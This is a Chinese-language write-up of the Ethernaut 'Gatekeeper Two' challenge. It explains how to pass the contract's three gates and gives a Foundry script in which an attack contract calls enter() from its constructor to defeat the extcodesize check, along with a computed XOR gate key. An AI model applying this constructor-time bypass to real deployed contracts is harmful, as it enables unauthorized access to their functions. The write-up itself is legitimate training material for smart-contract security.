# Ethernaut CTF Writeup

## Level 14 Gatekeeper Two

> 題目: https://ethernaut.openzeppelin.com/level/0x6A77737803b581B79D5323016f59DFbfE681b336

原始碼:
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint256 x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```

過關條件: 

- 跨越守衛的守衛並且註冊成為參賽者

解法：

- 通過 `gateOne()`: 交互者要為另一個合約
- 通過 `gateTwo()`: 檢查呼叫者的程式碼大小 (extcodesize) 是否為 0。通常當部署一個合約時，它的程式碼大小會大於 0。然而，在合約的構造函數執行期間，程式碼大小仍然是 0。因此，需要在合約構造函數中呼叫 enter 函數。
- 通過 `gateThree()`: 根據條件可反推 gatekey 為 `bytes8 _gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);`

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import {GatekeeperTwo} from "../src/level14/GatekeeperTwo.sol";

contract GatekeeperTwoAttack {
    GatekeeperTwo public target;

    constructor(address _targetAddress) {
        target = GatekeeperTwo(_targetAddress);

        // Step 1: Calculate _gateKey
        bytes8 _gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);

        // Step 2: Call the `enter` function
        target.enter(_gateKey);
    }
}

contract Attack is Script {
    function run() public {
        vm.startBroadcast();

        GatekeeperTwoAttack attack = new GatekeeperTwoAttack(0x82a72c7eD1c469EA8e17DD87DdcddDf1C5596def);
        
        vm.stopBroadcast();
    }
}

```